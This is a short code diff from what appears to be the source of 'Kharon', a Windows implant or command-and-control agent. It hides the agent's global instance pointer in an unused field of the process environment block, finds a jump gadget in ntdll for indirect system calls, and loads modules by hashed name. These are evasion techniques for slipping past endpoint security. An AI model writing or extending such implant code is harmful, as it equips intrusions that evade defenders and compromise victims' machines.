@@ -69,11 +69,16 @@ DECLFN Kharon::Kharon( VOID ) {
 
     RSL_IMP( Ntdll  );
     RSL_IMP( Krnl32 );
+
+    /* ========= [ set global kharon instance ] ========= */
+    
+    NtCurrentPeb()->TelemetryCoverageHeader = (PTELEMETRY_COVERAGE_HEADER)this;
 }
 
 auto DECLFN Kharon::Init(
     VOID
 ) -> void {
+    this->Mk->Ctx.JmpGadget = this->Usf->FindGadget( this->Ntdll.Handle, 0x23 );
     /* ========= [ init modules and funcs ] ========= */
     this->Mscoree.Handle   = LdrLoad::Module( Hsh::Str<CHAR>( "mscoree.dll" ) );
     this->Advapi32.Handle  = LdrLoad::Module( Hsh::Str<CHAR>( "advapi32.dll" ) );
@@ -132,10 +137,6 @@ auto DECLFN Kharon::Init(
     KhDbgz( "library cryptbase.dll loaded at %p and functions resolveds", this->Cryptbase.Handle );
     KhDbgz( "library ws2_32.dll    loaded at %p and functions resolveds", this->Ws2_32.Handle    );
     KhDbgz( "library msvcrt.dll    loaded at %p and functions resolveds", this->Msvcrt.Handle    );
-
-    /* ========= [ set global kharon instance ] ========= */
-
-    NtCurrentPeb()->TelemetryCoverageHeader = (PTELEMETRY_COVERAGE_HEADER)this;
 
     /* ========= [ syscalls setup ] ========= */
     this->Sys->Ext[syAlloc].Address    = U_PTR( this->Ntdll.NtAllocateVirtualMemory );
